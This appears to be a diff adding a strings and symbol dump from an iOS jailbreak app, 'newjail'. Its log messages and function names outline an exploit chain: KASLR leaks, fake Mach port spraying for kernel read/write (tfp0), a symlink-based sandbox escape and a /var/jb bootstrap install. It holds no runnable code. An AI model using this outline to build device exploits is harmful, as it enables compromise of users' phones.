+[stage2] Kernel slide: 0x%llx
+[stage2] kernel_task @ 0x%llx
+[stage2] Failed to spray fake port
+[stage2] Failed to receive from corrupted port: 0x%x
+[stage2] Attempting to use corrupted port directly...
+[stage2] Received message from corrupted port
+[stage2] Extracted tfp0 from message: 0x%x
+[stage2] Corrupted port works as tfp0!
+[stage2] Warning: tfp0 test read failed, may need retry
+[stage2] Kernel base verification: 0x%llx
+[stage2] 
+ Kernel R/W established!
+[stage2] Failed to establish kernel R/W
+[stage2] Estimated kernel base: 0x%llx
+[stage2] Estimated kernel_task @ 0x%llx (from gRegistryRoot)
+[stage2] Failed to create IOSurface for fake port
+[stage2] Fake port sprayed at IOSurface KVA 0x%llx
+[stage2] ip_kobject = 0x%llx (kernel_task)
+[stage3] === Sandbox Escape Stage ===
+[stage3] private sandbox API unavailable 
+ skipping (non-fatal)
+/var/mobile/Library/Preferences
+[stage3] escape verified
+[stage3] escape not confirmed (iOS 26 may be patched)
+[stage3] TOCTOU escape to: %s
+(null)
+sandbox_extension_issue_file
+sandbox_extension_consume
+sandbox_extension_release
+/usr/lib/system/libsystem_sandbox.dylib
+[stage3] sandbox api: issue=%p consume=%p release=%p => %s
+UNAVAILABLE
+/var/tmp/nj_link
+/var/mobile/Media/
+[stage3] symlink(safe) failed: %s
+com.apple.app-sandbox.read
+[stage3] issue_file returned NULL (blocked / unsupported)
+[stage3] got extension token (%zu bytes)
+[stage3] symlink(target) failed: %s
+[stage3] consume failed: %lld
+[stage3] extension consumed, handle=%lld
+%s/com.apple.mobile.gesture.plist
+[stage3] verification open failed: %s
+[stage3] SUCCESS: read %zd bytes from %s
+[stage3] first bytes: %.64s
+[stage3] read failed: %s
+[stage4] === Install /var/jb Stage ===
+/var/jb
+/var
+[stage4] No write access to /var (sandbox still active)
+[stage4] Failed to create %s: %d
+[stage4] Created %s
+/var/jb/bin
+/var/jb/usr/bin
+/var/jb/Library
+/var/jb/etc
+/var/jb/.installed
+newjail-0.1
+[stage4] Installed marker: %s
+[stage4] /var/jb bootstrap installed!
+Stage -1: CVE-2026-86950
+Stage -1b: CVE-2026-112611
+Stage 0: KASLR
+Stage 1: ANE
+Stage 2: KRW
+Stage 3: Sandbox
+Stage 4: /var/jb
+newjail.chain
+v8@?0
+newjail.log
+Waiting...
+newjail
+86950 + 112611 + full chain
+Target addr (hex), e.g. 0x0000000160000000
+Menlo
+0x0000000160000000
+StageCell
+=== newjail ready (27 modes) ===
+Mode ?
+Select mode
+v16@?0@"UIAlertAction"8
+Cancel
+[%@] %@
+Running...
+[UI] mode=%ld (%@) target=0x%llx
+86950 child sweep...
+112611 child sweep...
+86950 CG groom...
+Groom dump...
+Groom payload...
+SMARt v12...
+Diag...
+Testing...
+86950 width sweep...
+86950 bbox sweep...
+86950 stack mode...
+86950 huge groom...
+LR-Scan GEO...
+Geo-Sweep...
+UserFar hijack...
+Far direct read...
+16-bit increment probe...
+Width control sweep...
+Coord offset sweep...
+Stack probe...
+KASLR leaks...
+[KASLR] Running 65371 + 84530 + m2scaler leaks...
+[KASLR] result r=%d reg=0x%llx aio=0x%llx surf=0x%llx
+ANE OOB...
+[ANE] ERROR: need IOSurface KVA from KASLR. Run KASLR first.
+[ANE] Using surf=0x%llx from KASLR
+[ANE] result r=%d victim_port=0x%x
+KRW build...
+[KRW] ERROR: need reg + surf + victim_port from stages 0/1.
+[KRW] result r=%d tfp0=%p kslide=0x%llx
+Sandbox escape...
+Installing /var/jb...
+FULL chain...
+=== Reset ===
+Default Configuration
+<garbage>
+CGColor
+T#,R
+TQ,N,V_leak_aio
+T@"NSMutableArray",&,N,V_stageStatuses
+_kslide
+T@"NSString",?,R,C
+applicationWillEnterForeground:
+T@"UIActivityIndicatorView",&,N,V_spinner
+initWithActivityIndicatorStyle:
+T@"UIButton",&,N,V_resetButton
+jbQueue
+T@"UILabel",&,N,V_stageLabel
+release
+T@"UITextField",&,N,V_targetAddrField
+run86950CGGroom
+T@"UIWindow",&,N,V_window
+runGroomPayload
+TB,N,V_isRunning
+setBorderColor:
+TQ,N,V_kslide
+setBorderWidth:
+TQ,R
+setResetButton:
+Tq,N,V_selectedMode
+setVictim_port:
+_isRunning
+systemBlueColor
+_leak_aio
+targetAddrField
+.cxx_destruct
+T@"UITableView",&,N,V_tableView
+T@"NSArray",&,N,V_modeNames
+TQ,N,V_leak_reg
+T@"NSObject<OS_dispatch_queue>",&,N,V_jbQueue
+_window
+T@"NSString",R,C
+buttonWithType:
+T@"UIButton",&,N,V_modeButton
+isProxy
+T@"UIButton",&,N,V_runButton
+logView
+T@"UILabel",&,N,V_statusLabel
+T@"UITextView",&,N,V_logView
+runDiag
+T@"UIWindow",?,&,N
+sectionIndexTitlesForTableView:
+TI,N,V_victim_port
+setBorderStyle:
+TQ,N,V_leak_surf
+setPlaceholder:
+T^v,N,V_tfp0
+setStatusLabel:
+UTF8String
+spinner
+_jbQueue
+systemGrayColor
+_leak_reg
+_leak_surf
+_logView
+_modeButton
+_modeNames
+_resetButton
+_runButton
+_selectedMode
+_spinner
+_stageLabel
+_stageStatuses
+_statusLabel
+_tableView
+_targetAddrField
+_tfp0
+_victim_port
+actionWithTitle:style:handler:
+activateConstraints:
+addAction:
+addSubview:
+addTarget:action:forControlEvents:
+alertControllerWithTitle:message:preferredStyle:
+appendLog:
+appendString:
+application:configurationForConnectingSceneSession:options:
+application:continueUserActivity:restorationHandler:
+application:didChangeStatusBarFrame:
+application:didChangeStatusBarOrientation:
+application:didDecodeRestorableStateWithCoder:
+application:didDiscardSceneSessions:
+application:didFailToContinueUserActivityWithType:error:
+application:didFailToRegisterForRemoteNotificationsWithError:
+application:didFinishLaunchingWithOptions:
+application:didReceiveLocalNotification:
+application:didReceiveRemoteNotification:
+application:didReceiveRemoteNotification:fetchCompletionHandler:
+application:didRegisterForRemoteNotificationsWithDeviceToken:
+application:didRegisterUserNotificationSettings:
+application:didUpdateUserActivity:
+application:handleActionWithIdentifier:forLocalNotification:completionHandler:
+application:handleActionWithIdentifier:forLocalNotification:withResponseInfo:completionHandler:
+application:handleActionWithIdentifier:forRemoteNotification:completionHandler:
+application:handleActionWithIdentifier:forRemoteNotification:withResponseInfo:completionHandler:
+application:handleEventsForBackgroundURLSession:completionHandler:
+application:handleIntent:completionHandler:
+application:handleOpenURL:
+application:handleWatchKitExtensionRequest:reply:
+application:handlerForIntent:
+application:openURL:options:
+application:openURL:sourceApplication:annotation:
+application:performActionForShortcutItem:completionHandler:
+application:performFetchWithCompletionHandler:
+application:shouldAllowExtensionPointIdentifier:
+application:shouldRestoreApplicationState:
+application:shouldRestoreSecureApplicationState:
+application:shouldSaveApplicationState:
+application:shouldSaveSecureApplicationState:
+application:supportedInterfaceOrientationsForWindow:
+application:userDidAcceptCloudKitShareWithMetadata:
+application:viewControllerWithRestorationIdentifierPath:coder:
+application:willChangeStatusBarFrame:
+application:willChangeStatusBarOrientation:duration:
+application:willContinueUserActivityWithType:
+application:willEncodeRestorableStateWithCoder:
+application:willFinishLaunchingWithOptions:
+applicationDidBecomeActive:
+applicationDidEnterBackground:
+applicationDidFinishLaunching:
+applicationDidReceiveMemoryWarning:
+applicationProtectedDataDidBecomeAvailable:
+applicationProtectedDataWillBecomeUnavailable:
+applicationShouldAutomaticallyLocalizeKeyCommands:
+applicationShouldRequestHealthAuthorization:
+applicationSignificantTimeChange:
+applicationWillResignActive:
+applicationWillTerminate:
+arrayWithObjects:
+arrayWithObjects:count:
+autorelease
+boldSystemFontOfSize:
+bottomAnchor
+bounds
+centerYAnchor
+class
+colorWithWhite:alpha:
+conformsToProtocol:
+constraintEqualToAnchor:
+constraintEqualToAnchor:constant:
+constraintEqualToConstant:
+contentView
+count
+date
+debugDescription
+dequeueReusableCellWithIdentifier:forIndexPath:
+description
+didTapMode:
+didTapReset:
+didTapRun:
+endEditing:
+fontWithName:size:
+hasPrefix:
+hash
+heightAnchor
+indexPathForPreferredFocusedViewInTableView:
+indexPathForRow:inSection:
+initWithFrame:style:
+initWithName:sessionRole:
+initWithStyle:reuseIdentifier:
+initWithWindowScene:
+isEqual:
+isKindOfClass:
+isMemberOfClass:
+isRunning
+kslide
+labelColor
+layer
+leadingAnchor
+leak_aio
+leak_reg
+leak_surf
+length
+lightGrayColor
+localizedStringFromDate:dateStyle:timeStyle:
+makeKeyAndVisible
+modeButton
+modeNames
+modeTitleForIndex:
+numberOfSectionsInTableView:
+objectAtIndexedSubscript:
+performSelector:
+performSelector:withObject:
+performSelector:withObject:withObject:
+popoverPresentationController
+preferredWindowingControlStyleForScene:
+presentViewController:animated:completion:
+rangeOfString:options:range:
+registerClass:forCellReuseIdentifier:
+reloadData
+reloadRowsAtIndexPaths:withRowAnimation:
+replaceCharactersInRange:withString:
+resetButton
+respondsToSelector:
+retain
+retainCount
+role
+run112611Test
+run86950BBox
+run86950Huge
+run86950Stack
+run86950Test
+run86950Width
+runANE
+runButton
+runCoordOff
+runFarRead
+runFullChain
+runGeoSweep
+runGroomDump
+runInc16
+runInstall
+runKASLR
+runKRW
+runLRScan
+runOOB112611
+runOOB86950
+runSMARt
+runSandbox
+runStackProbe
+runUserFar
+runWidthCtl
+safeAreaLayoutGuide
+scene:continueUserActivity:
+scene:didFailToContinueUserActivityWithType:error:
+scene:didUpdateUserActivity:
+scene:openURLContexts:
+scene:restoreInteractionStateWithUserActivity:
+scene:willConnectToSession:options:
+scene:willContinueUserActivityWithType:
+sceneDidBecomeActive:
+sceneDidDisconnect:
+sceneDidEnterBackground:
+sceneWillEnterForeground:
+sceneWillResignActive:
+scrollRangeToVisible:
+scrollViewDidChangeAdjustedContentInset:
+scrollViewDidEndDecelerating:
+scrollViewDidEndDragging:willDecelerate:
+scrollViewDidEndScrollingAnimation:
+scrollViewDidEndZooming:withView:atScale:
+scrollViewDidScroll:
+scrollViewDidScrollToTop:
+scrollViewDidZoom:
+scrollViewShouldScrollToTop:
+scrollViewWillBeginDecelerating:
+scrollViewWillBeginDragging:
+scrollViewWillBeginZooming:withView:
+scrollViewWillEndDragging:withVelocity:targetContentOffset:
+secondaryLabelColor
+selectedMode
+self
+setAutocapitalizationType:
+setAutocorrectionType:
+setBackgroundColor:
+setContentEdgeInsets:
+setContentHorizontalAlignment:
+setCornerRadius:
+setDataSource:
+setDelegate:
+setEditable:
+setEnabled:
+setFont:
+setHidesWhenStopped:
+setIsRunning:
+setJbQueue:
+setKslide:
+setLeak_aio:
+setLeak_reg:
+setLeak_surf:
+setLogView:
+setModeButton:
+setModeNames:
+setObject:atIndexedSubscript:
+setRootViewController:
+setRowHeight:
+setRunButton:
+setSelectable:
+setSelectedMode:
+setSourceRect:
+setSourceView:
+setSpinner:
+setStage:status:running:
+setStageLabel:
+setStageStatuses:
+setString:
+setTableView:
+setTargetAddrField:
+setText:
+setTextAlignment:
+setTextColor:
+setTfp0:
+setTitle:forState:
+setTitleColor:forState:
+setTranslatesAutoresizingMaskIntoConstraints:
+setWindow:
+stageLabel
+stageStatuses
+startAnimating
+stateRestorationActivityForScene:
+statusLabel
+stopAnimating
+string
+stringByAppendingString:
+stringWithFormat:
+stringWithUTF8String:
+substringToIndex:
+superclass
+supportedInterfaceOrientationsForWindowScene:
+systemBackgroundColor
+systemFontOfSize:
+systemFontOfSize:weight:
+systemGreenColor
+systemOrangeColor
+systemRedColor
+tableView
+tableView:accessoryButtonTappedForRowWithIndexPath:
+tableView:accessoryTypeForRowWithIndexPath:
+tableView:canEditRowAtIndexPath:
+tableView:canFocusRowAtIndexPath:
+tableView:canMoveRowAtIndexPath:
+tableView:canPerformAction:forRowAtIndexPath:withSender:
+tableView:canPerformPrimaryActionForRowAtIndexPath:
+tableView:cellForRowAtIndexPath:
+tableView:commitEditingStyle:forRowAtIndexPath:
+tableView:contextMenuConfigurationForRowAtIndexPath:point:
+tableView:didBeginMultipleSelectionInteractionAtIndexPath:
+tableView:didDeselectRowAtIndexPath:
+tableView:didEndDisplayingCell:forRowAtIndexPath:
+tableView:didEndDisplayingFooterView:forSection:
+tableView:didEndDisplayingHeaderView:forSection:
+tableView:didEndEditingRowAtIndexPath:
+tableView:didHighlightRowAtIndexPath:
+tableView:didSelectRowAtIndexPath:
+tableView:didUnhighlightRowAtIndexPath:
+tableView:didUpdateFocusInContext:withAnimationCoordinator:
+tableView:editActionsForRowAtIndexPath:
+tableView:editingStyleForRowAtIndexPath:
+tableView:estimatedHeightForFooterInSection:
+tableView:estimatedHeightForHeaderInSection:
+tableView:estimatedHeightForRowAtIndexPath:
+tableView:heightForFooterInSection:
+tableView:heightForHeaderInSection:
+tableView:heightForRowAtIndexPath:
+tableView:indentationLevelForRowAtIndexPath:
+tableView:leadingSwipeActionsConfigurationForRowAtIndexPath:
+tableView:moveRowAtIndexPath:toIndexPath:
+tableView:numberOfRowsInSection:
+tableView:performAction:forRowAtIndexPath:withSender:
+tableView:performPrimaryActionForRowAtIndexPath:
+tableView:previewForDismissingContextMenuWithConfiguration:
+tableView:previewForHighlightingContextMenuWithConfiguration:
+tableView:sectionForSectionIndexTitle:atIndex:
+tableView:selectionFollowsFocusForRowAtIndexPath:
+tableView:shouldBeginMultipleSelectionInteractionAtIndexPath:
+tableView:shouldHighlightRowAtIndexPath:
+tableView:shouldIndentWhileEditingRowAtIndexPath:
+tableView:shouldShowMenuForRowAtIndexPath:
+tableView:shouldSpringLoadRowAtIndexPath:withContext:
+tableView:shouldUpdateFocusInContext:
+tableView:targetIndexPathForMoveFromRowAtIndexPath:toProposedIndexPath:
+tableView:titleForDeleteConfirmationButtonForRowAtIndexPath:
+tableView:titleForFooterInSection:
+tableView:titleForHeaderInSection:
+tableView:trailingSwipeActionsConfigurationForRowAtIndexPath:
+tableView:viewForFooterInSection:
+tableView:viewForHeaderInSection:
+tableView:willBeginEditingRowAtIndexPath:
+tableView:willDeselectRowAtIndexPath:
+tableView:willDisplayCell:forRowAtIndexPath:
+tableView:willDisplayContextMenuWithConfiguration:animator:
+tableView:willDisplayFooterView:forSection:
+tableView:willDisplayHeaderView:forSection:
+tableView:willEndContextMenuInteractionWithConfiguration:animator:
+tableView:willPerformPreviewActionForMenuWithConfiguration:animator:
+tableView:willSelectRowAtIndexPath:
+tableViewDidEndMultipleSelectionInteraction:
+text
+textField:editMenuForCharactersInRange:suggestedActions:
+textField:editMenuForCharactersInRanges:suggestedActions:
+textField:insertInputSuggestion:
+textField:shouldChangeCharactersInRange:replacementString:
+textField:shouldChangeCharactersInRanges:replacementString:
+textField:willDismissEditMenuWithAnimator:
+textField:willPresentEditMenuWithAnimator:
+textFieldDidBeginEditing:
+textFieldDidChangeSelection:
+textFieldDidEndEditing:
+textFieldDidEndEditing:reason:
+textFieldShouldBeginEditing:
+textFieldShouldClear:
+textFieldShouldEndEditing:
+textFieldShouldReturn:
+tfp0
+titleLabel
+topAnchor
+trailingAnchor
+updateStage:status:running:
+victim_port
+view
+viewDidLoad
+viewForZoomingInScrollView:
+whiteColor
+widthAnchor
+window
+windowScene:didUpdateCoordinateSpace:interfaceOrientation:traitCollection:
+windowScene:didUpdateEffectiveGeometry:
+windowScene:performActionForShortcutItem:completionHandler:
+windowScene:userDidAcceptCloudKitShareWithMetadata:
+zone
+StageCell
+JBViewController
+UITableViewDataSource
+NSObject
+UITableViewDelegate
+UIScrollViewDelegate
+UITextFieldDelegate
+SceneDelegate
+UIWindowSceneDelegate
+UISceneDelegate
+AppDelegate
+UIApplicationDelegate
+@32@0:8q16@24
+v36@0:8q16@24B32
+@16@0:8
+v24@0:8@16
+v16@0:8
+@"UILabel"
+@"UIActivityIndicatorView"
+B24@0:8@16
+#16@0:8
+@24@0:8:16
+@32@0:8:16@24
+@40@0:8:16@24@32
+B16@0:8
+B24@0:8#16
+B24@0:8:16
+Vv16@0:8
+Q16@0:8
+^{_NSZone=}16@0:8
+B24@0:8@"Protocol"16
+@"NSString"16@0:8
+q32@0:8@16q24
+@32@0:8@16@24
+q24@0:8@16
+@32@0:8@16q24
+B32@0:8@16@24
+@24@0:8@16
+q40@0:8@16@24q32
+v40@0:8@16q24@32
+v40@0:8@16@24@32
+q32@0:8@"UITableView"16q24
+@"UITableViewCell"32@0:8@"UITableView"16@"NSIndexPath"24
+q24@0:8@"UITableView"16
+@"NSString"32@0:8@"UITableView"16q24
+B32@0:8@"UITableView"16@"NSIndexPath"24
+@"NSArray"24@0:8@"UITableView"16
+q40@0:8@"UITableView"16@"NSString"24q32
+v40@0:8@"UITableView"16q24@"NSIndexPath"32
+v40@0:8@"UITableView"16@"NSIndexPath"24@"NSIndexPath"32
+v48@0:8@16{CGPoint=dd}24N^{CGPoint=dd}40
+v28@0:8@16B24
+v32@0:8@16@24
+v40@0:8@16@24d32
+v24@0:8@"UIScrollView"16
+v48@0:8@"UIScrollView"16{CGPoint=dd}24N^{CGPoint=dd}40
+v28@0:8@"UIScrollView"16B24
+@"UIView"24@0:8@"UIScrollView"16
+v32@0:8@"UIScrollView"16@"UIView"24
+v40@0:8@"UIScrollView"16@"UIView"24d32
+B24@0:8@"UIScrollView"16
+v40@0:8@16@24q32
+d32@0:8@16@24
+d32@0:8@16q24
+q32@0:8@16@24
+@40@0:8@16@24@32
+B48@0:8@16:24@32@40
+v48@0:8@16:24@32@40
+B40@0:8@16@24@32
+@48@0:8@16@24{CGPoint=dd}32
+v40@0:8@"UITableView"16@"UITableViewCell"24@"NSIndexPath"32
+v40@0:8@"UITableView"16@"UIView"24q32
+d32@0:8@"UITableView"16@"NSIndexPath"24
+d32@0:8@"UITableView"16q24
+@"UIView"32@0:8@"UITableView"16q24
+q32@0:8@"UITableView"16@"NSIndexPath"24
+v32@0:8@"UITableView"16@"NSIndexPath"24
+@"NSIndexPath"32@0:8@"UITableView"16@"NSIndexPath"24
+@"NSString"32@0:8@"UITableView"16@"NSIndexPath"24
+@"NSArray"32@0:8@"UITableView"16@"NSIndexPath"24
+@"UISwipeActionsConfiguration"32@0:8@"UITableView"16@"NSIndexPath"24
+@"NSIndexPath"40@0:8@"UITableView"16@"NSIndexPath"24@"NSIndexPath"32
+B48@0:8@"UITableView"16:24@"NSIndexPath"32@40
+v48@0:8@"UITableView"16:24@"NSIndexPath"32@40
+B32@0:8@"UITableView"16@"UITableViewFocusUpdateContext"24
+v40@0:8@"UITableView"16@"UITableViewFocusUpdateContext"24@"UIFocusAnimationCoordinator"32
+@"NSIndexPath"24@0:8@"UITableView"16
+B40@0:8@"UITableView"16@"NSIndexPath"24@"<UISpringLoadedInteractionContext>"32
+v24@0:8@"UITableView"16
+@"UIContextMenuConfiguration"48@0:8@"UITableView"16@"NSIndexPath"24{CGPoint=dd}32
+@"UITargetedPreview"32@0:8@"UITableView"16@"UIContextMenuConfiguration"24
+v40@0:8@"UITableView"16@"UIContextMenuConfiguration"24@"<UIContextMenuInteractionCommitAnimating>"32
+v40@0:8@"UITableView"16@"UIContextMenuConfiguration"24@"<UIContextMenuInteractionAnimating>"32
+v32@0:8@16q24
+B48@0:8@16{_NSRange=QQ}24@40
+@48@0:8@16{_NSRange=QQ}24@40
+B24@0:8@"UITextField"16
+v24@0:8@"UITextField"16
+v32@0:8@"UITextField"16q24
+B48@0:8@"UITextField"16{_NSRange=QQ}24@"NSString"40
+B40@0:8@"UITextField"16@"NSArray"24@"NSString"32
+@"UIMenu"48@0:8@"UITextField"16{_NSRange=QQ}24@"NSArray"40
+@"UIMenu"40@0:8@"UITextField"16@"NSArray"24@"NSArray"32
+v32@0:8@"UITextField"16@"<UIEditMenuInteractionAnimating>"24
+v32@0:8@"UITextField"16@"UIInputSuggestion"24
+@24@0:8q16
+q16@0:8
+v24@0:8q16
+v20@0:8B16
+v24@0:8Q16
+I16@0:8
+v20@0:8I16
+^v16@0:8
+v24@0:8^v16
+@"UITableView"
+@"UITextView"
+@"UIButton"
+@"NSArray"
+@"UITextField"
+@"NSMutableArray"
+@"NSObject<OS_dispatch_queue>"
+v40@0:8@"UIScene"16@"UISceneSession"24@"UISceneConnectionOptions"32
+v24@0:8@"UIScene"16
+v32@0:8@"UIScene"16@"NSSet"24
+@"NSUserActivity"24@0:8@"UIScene"16
+v32@0:8@"UIScene"16@"NSUserActivity"24
+v32@0:8@"UIScene"16@"NSString"24
+v40@0:8@"UIScene"16@"NSString"24@"NSError"32
+v48@0:8@16@24q32@40
+Q24@0:8@16
+v40@0:8@16@24@?32
+v48@0:8@"UIWindowScene"16@"<UICoordinateSpace>"24q32@"UITraitCollection"40
+v32@0:8@"UIWindowScene"16@"UIWindowSceneGeometry"24
+Q24@0:8@"UIWindowScene"16
+v40@0:8@"UIWindowScene"16@"UIApplicationShortcutItem"24@?<v@?B>32
+v32@0:8@"UIWindowScene"16@"CKShareMetadata"24
+@"UISceneWindowingControlStyle"24@0:8@"UIWindowScene"16
+@"UIWindow"16@0:8
+v24@0:8@"UIWindow"16
+@"UIWindow"
+B48@0:8@16@24@32@40
+v40@0:8@16q24d32
+v56@0:8@16{CGRect={CGPoint=dd}{CGSize=dd}}24
+v48@0:8@16@24@32@?40
+v56@0:8@16@24@32@40@?48
+v32@0:8@16@?24
+Q32@0:8@16@24
+B40@0:8@16@24@?32
+v24@0:8@"UIApplication"16
+B32@0:8@"UIApplication"16@"NSDictionary"24
+B32@0:8@"UIApplication"16@"NSURL"24
+B48@0:8@"UIApplication"16@"NSURL"24@"NSString"32@40
+B40@0:8@"UIApplication"16@"NSURL"24@"NSDictionary"32
+v40@0:8@"UIApplication"16q24d32
+v32@0:8@"UIApplication"16q24
+v56@0:8@"UIApplication"16{CGRect={CGPoint=dd}{CGSize=dd}}24
+v32@0:8@"UIApplication"16@"UIUserNotificationSettings"24
+v32@0:8@"UIApplication"16@"NSData"24
+v32@0:8@"UIApplication"16@"NSError"24
+v32@0:8@"UIApplication"16@"NSDictionary"24
+v32@0:8@"UIApplication"16@"UILocalNotification"24
+v48@0:8@"UIApplication"16@"NSString"24@"UILocalNotification"32@?<v@?>40
+v56@0:8@"UIApplication"16@"NSString"24@"NSDictionary"32@"NSDictionary"40@?<v@?>48
+v48@0:8@"UIApplication"16@"NSString"24@"NSDictionary"32@?<v@?>40
+v56@0:8@"UIApplication"16@"NSString"24@"UILocalNotification"32@"NSDictionary"40@?<v@?>48
+v40@0:8@"UIApplication"16@"NSDictionary"24@?<v@?Q>32
+v32@0:8@"UIApplication"16@?<v@?Q>24
+v40@0:8@"UIApplication"16@"UIApplicationShortcutItem"24@?<v@?B>32
+v40@0:8@"UIApplication"16@"NSString"24@?<v@?>32
+v40@0:8@"UIApplication"16@"NSDictionary"24@?<v@?@"NSDictionary">32
+@32@0:8@"UIApplication"16@"INIntent"24
+v40@0:8@"UIApplication"16@"INIntent"24@?<v@?@"INIntentResponse">32
+Q32@0:8@"UIApplication"16@"UIWindow"24
+B32@0:8@"UIApplication"16@"NSString"24
+@"UIViewController"40@0:8@"UIApplication"16@"NSArray"24@"NSCoder"32
+B32@0:8@"UIApplication"16@"NSCoder"24
+v32@0:8@"UIApplication"16@"NSCoder"24
+B40@0:8@"UIApplication"16@"NSUserActivity"24@?<v@?@"NSArray">32
+v40@0:8@"UIApplication"16@"NSString"24@"NSError"32
+v32@0:8@"UIApplication"16@"NSUserActivity"24
+v32@0:8@"UIApplication"16@"CKShareMetadata"24
+@"UISceneConfiguration"40@0:8@"UIApplication"16@"UISceneSession"24@"UISceneConnectionOptions"32
+v32@0:8@"UIApplication"16@"NSSet"24
+B24@0:8@"UIApplication"16
+__NSConcreteGlobalBlock
+___CFConstantStringClassReference
+_OBJC_CLASS_$_NSConstantArray
+_UIApplicationMain
+_UIFontWeightMedium
+_CGImageSourceCreateThumbnailAtIndex
+_CGImageSourceCreateWithDataProvider
+_kCGImageSourceCreateThumbnailFromImageAlways
+_kCGImageSourceThumbnailMaxPixelSize
+_CGBitmapContextCreate
+_CGBitmapContextGetData
+_CGColorSpaceCreateDeviceRGB
+_CGColorSpaceRelease
+_CGContextDrawPDFPage
+_CGContextRelease
+_CGDataProviderCreateWithCFData
+_CGDataProviderRelease
+_CGImageRelease
+_CGPDFDocumentCreateWithProvider
+_CGPDFDocumentGetPage
+_CGPDFDocumentRelease
+_CGPDFPageGetBoxRect
+_CGRectZero
+_NSStringFromClass
+_CFDataCreate
+_CFDictionaryCreate
+_CFDictionaryCreateMutable
+_CFDictionaryGetValue
+_CFDictionarySetValue
+_CFNumberCreate
+_CFRelease
+_CFStringGetCString
+_kCFAllocatorDefault
+_kCFBooleanTrue
+_kCFTypeDictionaryKeyCallBacks
+_kCFTypeDictionaryValueCallBacks
+_IOConnectCallStructMethod
+_IOIteratorNext
+_IONotificationPortCreate
+_IONotificationPortDestroy
+_IONotificationPortSetDispatchQueue
+_IOObjectGetClass
+_IOObjectRelease
+_IORegistryEntryCreateCFProperties
+_IOServiceAddInterestNotification
+_IOServiceClose
+_IOServiceGetMatchingService
+_IOServiceGetMatchingServices
+_IOServiceMatching
+_IOServiceOpen
+_IOSurfaceCreate
+_IOSurfaceGetBaseAddress
+_IOSurfaceGetID
+_IOSurfaceLock
+_IOSurfaceUnlock
+___objc_personality_v0
+_objc_alloc
+_objc_alloc_init
+_objc_autoreleasePoolPop
+_objc_autoreleasePoolPush
+_objc_autoreleaseReturnValue
+_objc_copyWeak
+_objc_destroyWeak
+_objc_initWeak
+_objc_loadWeakRetained
+_objc_msgSend
+_objc_msgSendSuper2
+_objc_opt_class
+_objc_opt_isKindOfClass
+_objc_opt_new
+_objc_opt_respondsToSelector
+_objc_release
+_objc_retain
+_objc_retainAutorelease
+_objc_retainAutoreleasedReturnValue
+_objc_storeStrong
+_objc_storeWeak
+__NSConcreteStackBlock
+__NSGetExecutablePath
+__Unwind_Resume
+___chkstk_darwin
+___error
+___memcpy_chk
+___sprintf_chk
+___stack_chk_fail
+___stack_chk_guard
+___stderrp
+__dispatch_main_q
+__exit
+_access
+_aio_cancel
+_aio_read
+_atof
+_atoi
+_atol
+_bzero
+_calloc
+_close
+_closedir
+_dispatch_async
+_dispatch_once
+_dispatch_queue_create
+_dispatch_semaphore_create
+_dispatch_semaphore_signal
+_dispatch_semaphore_wait
+_dispatch_time
+_dladdr
+_dlclose
+_dlerror
+_dlopen
+_dlsym
+_environ
+_fclose
+_fopen
+_fork
+_fprintf
+_fread
+_free
+_fscanf
+_fseek
+_fsync
+_ftell
+_ftruncate
+_fwrite
+_getenv
+_getpid
+_kill
+_kqueue
+_mach_msg
+_mach_port_allocate
+_mach_port_deallocate
+_mach_port_destroy
+_mach_port_insert_right
+_mach_task_self_
+_mach_vm_allocate
+_mach_vm_deallocate
+_mach_vm_map
+_mach_vm_protect
+_mach_vm_read_overwrite
+_mach_vm_remap
+_mach_vm_write
+_madvise
+_malloc
+_memcpy
+_memset
+_mkdir
+_mmap
+_munmap
+_open
+_opendir
+_posix_spawn
+_posix_spawnattr_destroy
+_posix_spawnattr_init
+_posix_spawnattr_setflags
+_posix_spawnattr_setsigdefault
+_posix_spawnattr_setsigmask
+_proc_pidfdinfo
+_pthread_equal
+_pthread_self
+_raise
+_read
+_readdir
+_realloc
+_setenv
+_sigaction
+_siglongjmp
+_signal
+_sigsetjmp
+_snprintf
+_sprintf
+_stat
+_strcmp
+_strerror
+_strlen
+_strrchr
+_strstr
+_strtoull
+_symlink
+_unlink
+_unsetenv
+_usleep
+_vm_allocate
+_vm_deallocate
+_vm_region_64
+_vm_remap
+_vsnprintf
+_waitpid
+_write
+_OBJC_CLASS_$_UILabel
+_OBJC_CLASS_$_UIFont
+_OBJC_CLASS_$_UIColor
+_OBJC_CLASS_$_UIActivityIndicatorView
+_OBJC_CLASS_$_NSLayoutConstraint
+_OBJC_CLASS_$_NSArray
+_OBJC_CLASS_$_NSMutableString
+_OBJC_CLASS_$_NSMutableArray
+_OBJC_CLASS_$_UIButton
+_OBJC_CLASS_$_UITextField
+_OBJC_CLASS_$_UITableView
+_OBJC_CLASS_$_UITextView
+_OBJC_CLASS_$_NSString
+_OBJC_CLASS_$_UIAlertController
+_OBJC_CLASS_$_UIAlertAction
+_OBJC_CLASS_$_NSDateFormatter
+_OBJC_CLASS_$_NSDate
+_OBJC_CLASS_$_NSIndexPath
+_OBJC_CLASS_$_UIWindowScene
+_OBJC_CLASS_$_UIWindow
+_OBJC_CLASS_$_UISceneConfiguration
+__objc_empty_cache
+_OBJC_CLASS_$_UITableViewCell
+_OBJC_METACLASS_$_UITableViewCell
+_OBJC_METACLASS_$_NSObject
+_OBJC_CLASS_$_UIViewController
+_OBJC_METACLASS_$_UIViewController
+_OBJC_METACLASS_$_UIResponder
+_OBJC_CLASS_$_UIResponder
+ceneDelegate
+tageCell
+AppDelegate
+	JBViewController
+ceneDelegate
+ktageCell
+AppDelegate
+_JBViewController
+CLASS_$_
+;METACLASS_$_
+built_trigger_public
+raw_public
+force_reset
+render_
+hild_sweep
+oord_offset_sweep
+correlate
+direct_read
+hijack
+ixed_map_groom
+eometry_sweep
+room_near
+la_size
+lloc_groom
+nual_
+ega_sweep
+icro_sweep
+micro
+sweep
+1_c0_sweep
+exploit
+test
+ivot
+robe
+hading_
+tack_p
+inc16_probe
+lr_scan
+nc_sweep
+pc_diag
+try_all
+user_far_hijack
+variants
+width_control
+g_groom
+hild_sweep
+dump
+huge
+payload
+bbox_sweep
+diag
+exploit_v
+groom_
+stack_mode
+test
+width_control
+112611_
+86950_
+full_chain
+ead64
+	w_set_tfp0
+	write64
+112611
+86950
+main
+shading_for_child
+trigger_for_child
+build_pdf_public
+force_reset
+render_raw_public
+ane_corrupt
+child_entry
+_from_leaks
+0_kaslr_leaks
+2_build_krw
+3_sandbox_escape
+4_install_jb
+et_log_cb
+hading_
+tage
+86950_
+entry_
+oob_worker_
+render_
+OBJC_
+_mh_execute_header
+g_log_cb
+main
